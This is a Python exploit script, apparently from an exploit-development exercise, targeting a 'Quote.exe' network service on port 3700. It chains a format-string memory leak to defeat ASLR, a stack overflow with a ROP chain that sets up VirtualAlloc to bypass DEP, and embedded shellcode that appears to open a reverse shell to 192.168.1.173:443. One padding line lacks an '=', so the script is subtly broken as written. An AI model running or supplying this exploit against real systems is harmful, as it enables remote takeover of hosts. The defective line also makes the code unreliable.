import sys, socket
from struct import pack

class exploit():
    def __init__(self, host):
        self.host = host
        self.port = 3700
        self.quote_no = ""
        self.dllbase = ""

    def get_noq(self):
        print("[+] Getting Quote number...")

        buf = pack("<L", 0x385)
        quote = 0

        resp = b""

        while resp != b'INDEX_OUT_OF_BOUNDS':
            quote += 1
            buf = pack("<L", 0x385)

            buf += quote.to_bytes(2, 'little')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            s.send(buf)
            resp = s.recv(1024)
            #print("[+] Resp at quote no: " + str(quote) + " is: " + str(resp))
            s.close()
        
        self.quote_no = quote
        print("[+] Target quote: ", quote)

    def add_q(self):
        print("[+] Sending Leak Quote")
        buf = pack("<L", 0x386)                               # opcode (add quote)
        buf += b"This is a test w00t-%x%x%x%xX%x%x%x%xX%x%x%x%xX"                       # quote
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.send(buf)
        s.recv(1024)
        s.close()

    def read_q(self):
        print("[+] Obtaining leak")
        buf = pack("<L", 0x385)
        buf += pack("<L", self.quote_no)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.send(buf)
        resp = s.recv(1024)
        leaked = resp.split(b'w00t-')[1].split(b'X', 5)[1]                 #5th dword is the leak 
        leaked = str(leaked)
        leaked = leaked[:len(leaked)-3]
        leaked = "0x00" + str(leaked).split("b'")[1]
        print("[+] Leaked Quote.exe address: ", leaked)

        dllbase = int(leaked, 16)
        self.dllbase = dllbase - 0x18fb
        print("[+] Quote.exe base address: ", str(hex(self.dllbase)))

    def fire(self):

        badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        badchars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        badchars += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        badchars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        badchars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        badchars += b"\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        badchars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed"

        shellcode =  b""
        shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
        shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
        shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
        shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
        shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
        shellcode += b"\x6a\x05\x68\xc0\xa8\x01\xad\x68\x02\x00\x01"
        shellcode += b"\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
        shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
        shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
        shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
        shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
        shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
        shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
        shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
        shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
        shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
        shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
        shellcode += b"\x6a\x00\x53\xff\xd5"

        dllbase = self.dllbase

        va = pack("<L", (0x45454545))                # dummy VirtualAlloc Address # -0x1c
        va += pack("<L", (0x46464646))               # Shellcode return address   # -0x18
        va += pack("<L", (0x47474747))               # dummy shellcode address    # -0x14
        va += pack("<L", (0x48484848))               # dummy dwSize               # -0x10
        va += pack("<L", (0x49494949))               # dummy flAllocationType     # -0x0c
        va += pack("<L", (0x51515151))               # dummy flProtect            # -0x08

        pad = b"D" * (2064-(len(va)))
        
        # updating VAlloc addr

        rop = pack("<L", dllbase + 0x25c0)           # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e69)          # or eax, esp (esp in eax)
        rop += pack("<L", dllbase + 0x1e73)          # mov ebx, eax ; ret (esp in ebx)
        rop += pack("<L", dllbase + 0x2b37)          # pop eax ; pop ecx ; ret
        rop += pack("<L", dllbase + 0x43218)         # IAT addr of VAlloc
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e6c)          # mov eax, dword [eax] ; add ecx, 0x05 ; pop edx ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0xa92c)          # xchg eax, ebp ; ret
        rop += pack("<L", dllbase + 0x25c0)          # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e7b)          # add eax, ebx ; xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x2b38)          # pop ecx ; ret
        rop += pack("<L", 0xffffffe0)                # -0x10
        rop += pack("<L", dllbase + 0x9b36)          # add eax, ecx ; pop ebx ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e73)          # mov ebx, eax ; ret (esp in ebx)
        rop += pack("<L", dllbase + 0xa92c)          # xchg eax, ebp ; ret (Valloc addr in eax)
        rop += pack("<L", dllbase + 0x1e7a)          # mov dword [ebx], eax ; ret

        # updating shellcode return addr

        rop += pack("<L", dllbase + 0x25c0)          # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e7b)          # add eax, ebx ; xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e73)          # mov ebx, eax ; ret (esp in ebx)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x2b38)          # pop ecx ; ret
        rop += pack("<L", 0x600)                     # -0x10
        rop += pack("<L", dllbase + 0x9b36)          # add eax, ecx ; pop ebx ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x1e7a)          # mov dword [ebx], eax ; ret

        # updating shellcode addr

        rop += pack("<L", dllbase + 0xa92c)          # xchg eax, ebp ; ret (saving shellcode addr)
        rop += pack("<L", dllbase + 0x25c0)          # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e7b)          # add eax, ebx ; xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e73)          # mov ebx, eax ; ret (esp in ebx)
        rop += pack("<L", dllbase + 0xa92c)          # xchg eax, ebp ; ret (Valloc addr in eax)
        rop += pack("<L", dllbase + 0x1e7a)          # mov dword [ebx], eax ; ret

        # updating dwSize

        rop += pack("<L", dllbase + 0x25c0)          # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e7b)          # add eax, ebx ; xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e73)          # mov ebx, eax ; ret (esp in ebx)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x2b37)          # pop eax ; pop ecx ; ret
        rop += pack("<L", 0x66666711)                #
        rop += pack("<L", 0x99999eef)                #
        rop += pack("<L", dllbase + 0x9b36)          # add eax, ecx ; pop ebx ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x1e7a)          # mov dword [ebx], eax ; ret

        # updating flAllocationType

        rop += pack("<L", dllbase + 0x25c0)          # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e7b)          # add eax, ebx ; xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e73)          # mov ebx, eax ; ret (esp in ebx)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x2b37)          # pop eax ; pop ecx ; ret
        rop += pack("<L", 0x66667111)                #
        rop += pack("<L", 0x99999eef)                #
        rop += pack("<L", dllbase + 0x9b36)          # add eax, ecx ; pop ebx ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x1e7a)          # mov dword [ebx], eax ; ret

        # updating flProtect

        rop += pack("<L", dllbase + 0x25c0)          # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e7b)          # add eax, ebx ; xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x6403)          # inc eax ; pop ebx ; pop esi ; pop edi ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e73)          # mov ebx, eax ; ret (esp in ebx)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x2b37)          # pop eax ; pop ecx ; ret
        rop += pack("<L", 0x66667050)                #
        rop += pack("<L", 0x99998ff0)                #
        rop += pack("<L", dllbase + 0x9b36)          # add eax, ecx ; pop ebx ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x1e7b+0x2)      # xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x1e7a)          # mov dword [ebx], eax ; ret

        # align ESP with skeleton

        rop += pack("<L", dllbase + 0x25c0)          # xor eax, eax ; ret
        rop += pack("<L", dllbase + 0x1e7b)          # add eax, ebx ; xchg edx, ebx ; cmp ebx, eax ; ret
        rop += pack("<L", dllbase + 0x2b38)          # pop ecx ; ret
        rop += pack("<L", 0xffffffec)
        rop += pack("<L", dllbase + 0x9b36)          # add eax, ecx ; pop ebx ; ret
        rop += pack("<L", 0x44444444)
        rop += pack("<L", dllbase + 0x344d)          # xchg eax, esp ; ret

        pad2 b"A" * 920
        pad2 += b"\x90" * 8

        buf = pad + va + rop + pad2 + shellcode

        print("[+] Sending Exploit Request")
        print("Len buf:", len(buf))

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.send(buf)
        s.close()


def main():
    host = sys.argv[1]
    e = exploit(host)
    e.get_noq()
    e.add_q()
    e.read_q()
    e.fire()

if __name__ == "__main__": 

    main()
